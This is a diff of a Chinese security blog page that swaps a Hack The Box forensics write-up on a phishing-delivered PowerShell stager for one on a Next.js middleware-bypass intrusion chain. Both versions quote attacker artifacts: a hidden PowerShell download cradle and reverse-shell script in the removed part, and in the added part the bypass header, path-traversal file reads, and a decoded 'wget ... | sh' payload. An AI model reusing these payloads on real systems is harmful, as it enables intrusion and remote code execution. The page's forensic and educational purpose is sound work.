@@ -19,33 +19,39 @@
   <meta name="author" content="butt3rf1y">
   <meta name="keywords" content="">
   
-    <meta name="description" content="关于 Windows 的注册表取证">
+    <meta name="description" content="关于 Next.js 中间件鉴权绕过的漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTB-Pikaptcha">
-<meta property="og:url" content="http://example.com/2025/04/13/HTB-Pikaptcha/index.html">
+<meta property="og:title" content="HTB-NeuroSync-D">
+<meta property="og:url" content="http://example.com/2025/04/14/HTB-NeuroSync-D/index.html">
 <meta property="og:site_name" content="(｡･ω･｡)Welcome~">
-<meta property="og:description" content="关于 Windows 的注册表取证">
+<meta property="og:description" content="关于 Next.js 中间件鉴权绕过的漏洞">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/d79abedada005e31.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/973c45ff742acec1.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/5e7f37e89844e2e7.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/e8829d2cb860f285.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/45f2d3e3d99ce3f3.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/1c4ba07cdcd823a4.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/8b808ac416206d10.png">
-<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/51eb1e7f381ba720.png">
-<meta property="article:published_time" content="2025-04-12T16:13:47.000Z">
-<meta property="article:modified_time" content="2025-04-12T16:39:44.107Z">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/e8deead847d7f189.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/09b3a46e3310b504.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/05516e87ef1fd463.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/b5575411c2ba5ce3.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/eea8e602f2f610ba.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/3bc95d55c7645f56.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/8e1d1ccc558c8a51.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/7c1d5e98c3054393.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/57485405d8688827.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/6560a49952a3c10c.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/4d6e0153ded31eaf.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/844cabc6bfcb50de.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/004f120f4bbc4c34.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/63b90d934f53470b.png">
+<meta property="article:published_time" content="2025-04-14T15:50:16.000Z">
+<meta property="article:modified_time" content="2025-04-14T16:03:13.430Z">
 <meta property="article:author" content="butt3rf1y">
 <meta property="article:tag" content="应急响应">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/d79abedada005e31.png">
+<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/e8deead847d7f189.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>HTB-Pikaptcha - (｡･ω･｡)Welcome~</title>
+  <title>HTB-NeuroSync-D - (｡･ω･｡)Welcome~</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -234,7 +240,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="HTB-Pikaptcha"></span>
+            <span id="subtitle" data-typed-text="HTB-NeuroSync-D"></span>
           
         </div>
 
@@ -245,8 +251,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-04-13 00:13" pubdate>
-          2025年4月13日 凌晨
+        <time datetime="2025-04-14 23:50" pubdate>
+          2025年4月14日 晚上
         </time>
       </span>
     
@@ -257,7 +263,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          517 字
+          904 字
         
       </span>
     
@@ -268,7 +274,7 @@
         
         
         
-          5 分钟
+          8 分钟
         
       </span>
     
@@ -315,12 +321,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">HTB-Pikaptcha</h1>
+            <h1 id="seo-header">HTB-NeuroSync-D</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年4月13日 凌晨
+                    本文最后更新于 2025年4月15日 凌晨
                   
                 
               </p>
@@ -328,58 +334,79 @@
             
               <div class="markdown-body">
                 
-                <p>关于 Windows 的注册表取证</p>
+                <p>关于 Next.js 中间件鉴权绕过的漏洞</p>
 <span id="more"></span>
 
-<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.</p>
-<h1 id="分析用户-happy-grunwald-的注册表配置单元，查找其下载并执行-stager-的完整命令"><a href="#分析用户-happy-grunwald-的注册表配置单元，查找其下载并执行-stager-的完整命令" class="headerlink" title="分析用户 happy grunwald 的注册表配置单元，查找其下载并执行 stager 的完整命令"></a>分析用户 happy grunwald 的注册表配置单元，查找其下载并执行 stager 的完整命令</h1><p>tree 一下发现文件中有多个用户（实际上也只用了一个）</p>
-<p><img src="https://img.dkdun.cn/v1/2025/12/d79abedada005e31.png"></p>
-<p>用 <a target="_blank" rel="noopener" href="https://ericzimmerman.github.io/#!index.md">Registry Explorer</a> 打开 <code>Pikaptcha\2024-09-23T052209_alert_mssp_action\C\Users\happy.grunwald</code> 下的 <code>NTUSER.DAT</code> 文件，访问 <code>RunMRU</code> 文件夹，找到命令</p>
-<p><img src="https://img.dkdun.cn/v1/2025/12/973c45ff742acec1.png"></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell -NoP -NonI -W Hidden -Exec Bypass -Command &quot;IEX(New-Object <span class="hljs-built_in">Net</span>.WebClient).DownloadString(&#x27;http://<span class="hljs-number">43</span>.<span class="hljs-number">205</span>.<span class="hljs-number">115</span>.<span class="hljs-number">44</span>/office2024install.ps1&#x27;)&quot;<br></code></pre></td></tr></table></figure>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.</p>
+<h1 id="使用的-Next-js-版本"><a href="#使用的-Next-js-版本" class="headerlink" title="使用的 Next.js 版本"></a>使用的 Next.js 版本</h1><p>在 <code>interface.log</code> 文件中找到 Next.js 版本号</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/e8deead847d7f189.png"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">15</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
 
-<ul>
-<li>NoP：NoProfile，不加载 PowerShell 配置文件，快速启动</li>
-<li>NonI：Nonlnteractive，非交互模式</li>
-<li>W Hidden：WindowStyle Hidden，隐藏 PowerShell 窗口，让用户无法察觉程序运行</li>
-<li>Exec Bypass：ExecutionPolicy Bypass，绕过系统脚本执行策略</li>
-<li>Command中的 <code>IRX</code>：Invoke-Expression，直接执行下载的脚本</li>
-</ul>
-<p>整个命令的作用就是：下载来自 IP <code>43.205.115.44</code> 的 <code>office2024install.ps1</code> 脚本，但下载和执行都被隐藏了</p>
-<h1 id="payload-执行的-UTC-时间"><a href="#payload-执行的-UTC-时间" class="headerlink" title="payload 执行的 UTC 时间"></a>payload 执行的 UTC 时间</h1><p><img src="https://img.dkdun.cn/v1/2025/12/5e7f37e89844e2e7.png"></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">23</span> <span class="hljs-number">05</span>:<span class="hljs-number">07</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure>
+<h1 id="Next-js-本地运行端口"><a href="#Next-js-本地运行端口" class="headerlink" title="Next.js 本地运行端口"></a>Next.js 本地运行端口</h1><p><img src="https://img.dkdun.cn/v1/2025/12/09b3a46e3310b504.png"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure>
 
-<h1 id="找出该脚本的-SHA256-哈希值"><a href="#找出该脚本的-SHA256-哈希值" class="headerlink" title="找出该脚本的 SHA256 哈希值"></a>找出该脚本的 SHA256 哈希值</h1><p> 加载流量包，导出关于 <code>office2024install.ps1</code> 的文件</p>
-<p><img src="https://img.dkdun.cn/v1/2025/12/e8829d2cb860f285.png"></p>
-<p>获取 hash 值</p>
-<p><img src="https://img.dkdun.cn/v1/2025/12/45f2d3e3d99ce3f3.png"></p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">579284442094e1</span>a<span class="hljs-number">44</span>bea<span class="hljs-number">9</span>cfb<span class="hljs-number">7</span>d<span class="hljs-number">8</span>d<span class="hljs-number">794</span><span class="hljs-keyword">c</span><span class="hljs-number">8977714</span>f<span class="hljs-number">827</span><span class="hljs-keyword">c</span><span class="hljs-number">97</span>bcb<span class="hljs-number">2822</span>a<span class="hljs-number">97742914</span>de<br></code></pre></td></tr></table></figure>
+<h1 id="符和此版本的-Next-js-的-CVE-编号"><a href="#符和此版本的-Next-js-的-CVE-编号" class="headerlink" title="符和此版本的 Next.js 的 CVE 编号"></a>符和此版本的 Next.js 的 CVE 编号</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CVE-Lemon/p/18789173">CVE-2025-29927 Next.js 中间件权限绕过漏洞</a>，通过添加 <code>x-middleware-subrequest</code> 请求头绕过中间件安全控制</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/05516e87ef1fd463.png"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2025</span>-<span class="hljs-number">29927</span><br></code></pre></td></tr></table></figure>
 
-<h1 id="反向-shell-连接的端口"><a href="#反向-shell-连接的端口" class="headerlink" title="反向 shell 连接的端口"></a>反向 shell 连接的端口</h1><p>把 <code>office2024install.ps1</code> 文件内容解码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">$client = New - Object System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;43.205.115.44&quot;</span>, <span class="hljs-number">6969</span>);<br>$stream = $client.GetStream(); [<span class="hljs-type">byte</span>[]] $bytes = <span class="hljs-number">0.</span><span class="hljs-number">.65535</span> | %&#123;<br>    <span class="hljs-number">0</span><br>&#125;;<br><span class="hljs-keyword">while</span> (($i = $stream.Read($bytes, <span class="hljs-number">0</span>, $bytes.Length)) - ne <span class="hljs-number">0</span>) &#123;;<br>    $data = (New - Object - TypeName System.Text.ASCIIEncoding).GetString($bytes, <span class="hljs-number">0</span>, $i);<br>    $sendback = (iex $data <span class="hljs-number">2</span> &gt; &amp;<span class="hljs-number">1</span> | Out - String);<br>    $sendback2 = $sendback + <span class="hljs-string">&quot;PS &quot;</span> + (pwd).Path + <span class="hljs-string">&quot;&gt; &quot;</span>;<br>    $sendbyte = ([text.encoding] : :ASCII).GetBytes($sendback2);<br>    $stream.Write($sendbyte, <span class="hljs-number">0</span>, $sendbyte.Length);<br>    $stream.Flush()<br>&#125;;<br>$client.Close()<br></code></pre></td></tr></table></figure>
+<h1 id="通过枚举-Next-js-框架中的文件得到的第一个文件"><a href="#通过枚举-Next-js-框架中的文件得到的第一个文件" class="headerlink" title="通过枚举 Next.js 框架中的文件得到的第一个文件"></a>通过枚举 Next.js 框架中的文件得到的第一个文件</h1><p>在 <code>access.log</code> 文件中查找 HTTP 状态码为 200 的请求信息，第一个文件为 <code>main-app.js</code></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/b5575411c2ba5ce3.png"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>-app<span class="hljs-selector-class">.js</span><br></code></pre></td></tr></table></figure>
 
-<p>从中可以看出端口是 6969</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">6969</span><br></code></pre></td></tr></table></figure>
+<h1 id="受漏洞影响的-endpoint"><a href="#受漏洞影响的-endpoint" class="headerlink" title="受漏洞影响的 endpoint"></a>受漏洞影响的 endpoint</h1><p>查看 <code>interface.log</code> 文件可以发现对  <code>http://localhost:3000/api/bci/analytics</code> 请求了多次，并且使用了 <code>x-middleware-subrequest</code> 请求头</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">2025-04-01T11:37:59.699Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [[&quot;accept&quot;,&quot;*/*&quot;],[&quot;accept-encoding&quot;,&quot;gzip, deflate, br&quot;],[&quot;connection&quot;,&quot;close&quot;],[&quot;host&quot;,&quot;10.129.231.215&quot;],[&quot;user-agent&quot;,&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0&quot;],[&quot;x-forwarded-for&quot;,&quot;10.129.231.211&quot;],[&quot;x-forwarded-host&quot;,&quot;10.129.231.215&quot;],[&quot;x-forwarded-port&quot;,&quot;3000&quot;],[&quot;x-forwarded-proto&quot;,&quot;http&quot;],[&quot;x-middleware-subrequest&quot;,&quot;middleware&quot;],[&quot;x-real-ip&quot;,&quot;10.129.231.211&quot;]]<br></code></pre></td></tr></table></figure>
 
-<h1 id="C2-和工作站之间的反向-shell-连接建立持续时间"><a href="#C2-和工作站之间的反向-shell-连接建立持续时间" class="headerlink" title="C2 和工作站之间的反向 shell 连接建立持续时间"></a>C2 和工作站之间的反向 shell 连接建立持续时间</h1><p>因为前面已经找到反向 shell 的端口号了，所以直接过滤就行</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.port<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">6969</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img.dkdun.cn/v1/2025/12/eea8e602f2f610ba.png"></p>
+<p>所以 endpoint 为</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/api/</span>bci/analytics<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img.dkdun.cn/v1/2025/12/1c4ba07cdcd823a4.png"></p>
-<p>根据详细判断开始和结束时间，然后直接相减得到 403 s</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">403<br></code></pre></td></tr></table></figure>
+<h1 id="漏洞导致的未授权响应数量"><a href="#漏洞导致的未授权响应数量" class="headerlink" title="漏洞导致的未授权响应数量"></a>漏洞导致的未授权响应数量</h1><p>可以看到请求从 <code>2025-04-01 11:37:58</code> 开始到 <code>2025-04-01 11:38:04</code> 结束</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/3bc95d55c7645f56.png"></p>
+<p>从 <code>access.log</code> 查找此时间段信息发现 HTTP 状态码全为 401，这样的请求信息有 5 条</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/8e1d1ccc558c8a51.png"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">5<br></code></pre></td></tr></table></figure>
 
-<h1 id="包含-payload-的函数名称"><a href="#包含-payload-的函数名称" class="headerlink" title="包含 payload 的函数名称"></a>包含 payload 的函数名称</h1><p>过滤 IP 和端口，追踪 TCP 流发现下载 <code>BloodHound</code> 执行了 <code>SharpHound.ps1</code> 文件输出到 Windows 的 tmp 目录</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">addr</span>==43.205.115.44 &amp;&amp; tcp.<span class="hljs-attribute">port</span>==6969<br></code></pre></td></tr></table></figure>
+<h1 id="中间件被成功绕过的时间"><a href="#中间件被成功绕过的时间" class="headerlink" title="中间件被成功绕过的时间"></a>中间件被成功绕过的时间</h1><p> 401 请求响应后一条状态码变为了 200，说明已经被成功绕过</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/7c1d5e98c3054393.png"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">01</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">05</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img.dkdun.cn/v1/2025/12/8b808ac416206d10.png"></p>
-<p>这是一个能映射和量化 Active Directory 攻击路径的工具	，	但是在此并没有什么危害</p>
-<p>过滤 http 数据包</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">http&amp;&amp;ip.<span class="hljs-attribute">addr</span>==43.205.115.44<br></code></pre></td></tr></table></figure>
+<h1 id="绕过中间件的标头的值"><a href="#绕过中间件的标头的值" class="headerlink" title="绕过中间件的标头的值"></a>绕过中间件的标头的值</h1><p><a target="_blank" rel="noopener" href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">Next.js and the corrupt middleware: the authorizing artifact</a>，这篇文章中有对各版本更深入的研究</p>
+<p>查看 <a target="_blank" rel="noopener" href="https://github.com/vercel/next.js/blob/v15.1.0/packages/next/src/server/web/sandbox/sandbox.ts">Next.js v15.1.0 的源码</a> 中有漏洞的地方</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> runtime = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getRuntimeContext</span>(params)<br><span class="hljs-keyword">const</span> subreq = params.<span class="hljs-property">request</span>.<span class="hljs-property">headers</span>[<span class="hljs-string">`x-middleware-subrequest`</span>]<br><span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&#x27;string&#x27;</span> ? subreq.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>) : []<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_RECURSION_DEPTH</span> = <span class="hljs-number">5</span><br><span class="hljs-keyword">const</span> depth = subrequests.<span class="hljs-title function_">reduce</span>(<br>  <span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> (curr === params.<span class="hljs-property">name</span> ? acc + <span class="hljs-number">1</span> : acc),<br>  <span class="hljs-number">0</span><br>)<br><br><span class="hljs-keyword">if</span> (depth &gt;= <span class="hljs-variable constant_">MAX_RECURSION_DEPTH</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">waitUntil</span>: <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(),<br>    <span class="hljs-attr">response</span>: <span class="hljs-keyword">new</span> runtime.<span class="hljs-property">context</span>.<span class="hljs-title class_">Response</span>(<span class="hljs-literal">null</span>, &#123;<br>      <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&#x27;x-middleware-next&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>      &#125;,<br>    &#125;),<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>追踪 HTTP 流，发现 <code>stageClipboard()</code> 函数包含了 payload 命令</p>
-<p><img src="https://img.dkdun.cn/v1/2025/12/51eb1e7f381ba720.png"></p>
-<p>所以为		</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">stageClipboard</span><br></code></pre></td></tr></table></figure>
+<p>当 <code>x-middleware-subrequest</code> 的值以 <code>:</code> 分割一次并且值为 <code>params.name</code> 也就是中间件的路径时，<code>depth</code> 就 +1，如果 <code>depth</code> 大于等于 <code>MAX_RECURSION_DEPTH</code> 的值也就是 5 时，返回空响应并设置 <code>x-middleware-next</code> 的值为 1，这样能防止无限递归造成请求超时等</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/57485405d8688827.png"></p>
+<p>所以让 <code>depth &gt;= 5</code> 就能绕过中间件的鉴定</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-middleware-subrequest</span>: <span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:middleware<br></code></pre></td></tr></table></figure>
+
+<p>所以为</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">x-middleware-subrequest</span><span class="hljs-punctuation">: </span>middleware:middleware:middleware:middleware:middleware<br></code></pre></td></tr></table></figure>
+
+<h1 id="将该漏洞与-SSRF-攻击串联起来，因此能够执行内部端口扫描并发现内部-API。该-API-可以通过哪个端口访问"><a href="#将该漏洞与-SSRF-攻击串联起来，因此能够执行内部端口扫描并发现内部-API。该-API-可以通过哪个端口访问" class="headerlink" title="将该漏洞与 SSRF 攻击串联起来，因此能够执行内部端口扫描并发现内部 API。该 API 可以通过哪个端口访问"></a>将该漏洞与 SSRF 攻击串联起来，因此能够执行内部端口扫描并发现内部 API。该 API 可以通过哪个端口访问</h1><p>查看 <code>data-api.log</code> 文件的记录，根据攻击成功的时间段来看可以发现对 4000 端口进行了访问</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/6560a49952a3c10c.png"></p>
+<h1 id="在-API-中寻找易受攻击的-endpoint"><a href="#在-API-中寻找易受攻击的-endpoint" class="headerlink" title="在 API 中寻找易受攻击的 endpoint"></a>在 API 中寻找易受攻击的 endpoint</h1><p>可以发现对 <code>/logs</code> 请求后还进行了一些其他行为， <code>/logs?logFile=/var/log/../.../...//../.../...//etc/passwd</code> 和 <code>/logs?logFile=/var/log/../.../...//../.../...//proc/self/environ</code> ，遍历路径读取 <code>/etc/passwd</code> 和 <code>/proc/self/environ</code></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/4d6e0153ded31eaf.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/logs<br></code></pre></td></tr></table></figure>
+
+<h1 id="endpoint-首次被使用的时间"><a href="#endpoint-首次被使用的时间" class="headerlink" title="endpoint 首次被使用的时间"></a>endpoint 首次被使用的时间</h1><p>读取 <code>/etc/passwd</code> 的时间</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">01</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">01</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="endpoint-被利用的漏洞名称"><a href="#endpoint-被利用的漏洞名称" class="headerlink" title="endpoint 被利用的漏洞名称"></a>endpoint 被利用的漏洞名称</h1><p>从  <code>/logs?logFile=/var/log/../.../...//../.../...//etc/passwd</code> 和 <code>/logs?logFile=/var/log/../.../...//../.../...//proc/self/environ</code>  可以知道通过构造特定的文件路径，读取这些敏感文件，这种攻击方法符合利用 LFI 漏洞，也就是本地文件包含漏洞（Local File Inclusion）</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Local</span> <span class="hljs-keyword">File</span> Inclusion<br></code></pre></td></tr></table></figure>
+
+<h1 id="读取的文件"><a href="#读取的文件" class="headerlink" title="读取的文件"></a>读取的文件</h1><p><code>/tmp</code> 下的 <code>secret.key</code> 文件</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/844cabc6bfcb50de.png"></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">secret.<span class="hljs-type">key</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="查找允许执行-Redis-注入并获得-RCE的特殊命令"><a href="#查找允许执行-Redis-注入并获得-RCE的特殊命令" class="headerlink" title="查找允许执行 Redis 注入并获得 RCE的特殊命令"></a>查找允许执行 Redis 注入并获得 RCE的特殊命令</h1><p>查看 <code>redis.log</code> 文件找到命令</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/004f120f4bbc4c34.png"></p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">OS_EXEC|<span class="hljs-type">d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo</span>|<span class="hljs-type">f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="解码后的命令"><a href="#解码后的命令" class="headerlink" title="解码后的命令"></a>解码后的命令</h1><p>在 <code>bci-device.log</code> 里面能找到命令的明文</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/63b90d934f53470b.png"></p>
+<p>也可以 base64 解码 <code>d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">185.202</span>.<span class="hljs-number">2.147</span><span class="hljs-regexp">/h4Pln4/</span>run.sh -O- | sh<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -432,8 +459,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>HTB-Pikaptcha</div>
-      <div>http://example.com/2025/04/13/HTB-Pikaptcha/</div>
+      <div>HTB-NeuroSync-D</div>
+      <div>http://example.com/2025/04/14/HTB-NeuroSync-D/</div>
     </div>
     <div class="license-meta">
       
@@ -445,7 +472,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年4月13日</div>
+          <div>2025年4月14日</div>
         </div>
       
       
@@ -477,18 +504,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/14/HTB-LinkVortex/" title="HTB-LinkVortex">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">HTB-LinkVortex</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/04/11/HTB-Campfire-1/" title="HTB-Campfire-1">
-                        <span class="hidden-mobile">HTB-Campfire-1</span>
+                      <a href="/2025/04/14/HTB-LinkVortex/" title="HTB-LinkVortex">
+                        <span class="hidden-mobile">HTB-LinkVortex</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
